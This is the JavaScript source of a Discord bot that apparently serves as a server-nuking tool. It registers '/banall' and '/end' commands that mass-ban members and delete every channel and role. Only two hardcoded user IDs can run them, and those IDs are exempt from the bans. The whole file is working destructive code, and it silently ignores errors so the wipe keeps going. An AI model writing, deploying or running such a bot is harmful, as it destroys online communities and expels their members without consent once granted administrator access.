const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, PermissionFlagsBits } = require('discord.js');
const express = require('express');

// Simple web server to satisfy Render's port requirement
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('Bot is active!'));
app.listen(PORT, () => console.log(`Web server listening on port ${PORT}`));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers
    ]
});

const ALLOWED_USERS = ['1222291103974428814', '1255536194159247437'];

client.once('ready', async () => {
    console.log(`Logged in as ${client.user.tag}! Registering commands...`);

    const commands = [
        new SlashCommandBuilder()
            .setName('banall')
            .setDescription('Bans all eligible members from the server')
            .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
        new SlashCommandBuilder()
            .setName('end')
            .setDescription('Completely wipes the server: bans everyone, deletes channels and roles')
            .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);

    try {
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands }
        );
        console.log('Successfully registered /banall and /end commands.');
    } catch (error) {
        console.error(error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    // Security check for allowed user IDs
    if (!ALLOWED_USERS.includes(interaction.user.id)) {
        return interaction.reply({ 
            content: 'You do not have permission to use this command.', 
            ephemeral: true 
        });
    }

    const guild = interaction.guild;

    if (interaction.commandName === 'banall') {
        await interaction.deferReply({ ephemeral: true });
        try {
            let count = 0;
            const members = await guild.members.fetch();

            for (const [id, member] of members) {
                if (member.bannable && !ALLOWED_USERS.includes(id) && id !== client.user.id && id !== guild.ownerId) {
                    await member.ban({ reason: 'Mass ban execution' });
                    count++;
                }
            }

            await interaction.editReply(`Successfully banned ${count} members from **${guild.name}**.`);
        } catch (err) {
            await interaction.editReply(`Failed to complete mass ban: ${err.message}`);
        }
    }

    else if (interaction.commandName === 'end') {
        await interaction.deferReply({ ephemeral: true });
        try {
            // 1. Ban all eligible members
            const members = await guild.members.fetch();
            for (const [id, member] of members) {
                if (member.bannable && !ALLOWED_USERS.includes(id) && id !== client.user.id && id !== guild.ownerId) {
                    await member.ban({ reason: 'Server wipe /end executed' }).catch(() => {});
                }
            }

            // 2. Delete all channels
            const channels = await guild.channels.fetch();
            for (const [id, channel] of channels) {
                await channel.delete().catch(() => {});
            }

            // 3. Delete all roles (that the bot has permission to delete, excluding @everyone and managed roles)
            const roles = await guild.roles.fetch();
            for (const [id, role] of roles) {
                if (role.editable && !role.managed && role.id !== guild.id) {
                    await role.delete().catch(() => {});
                }
            }

        } catch (err) {
            // If channels are deleted mid-execution, editing reply might fail, but the wipe will process.
            console.error(`Wipe error: ${err.message}`);
        }
    }
});

client.login(process.env.TOKEN);
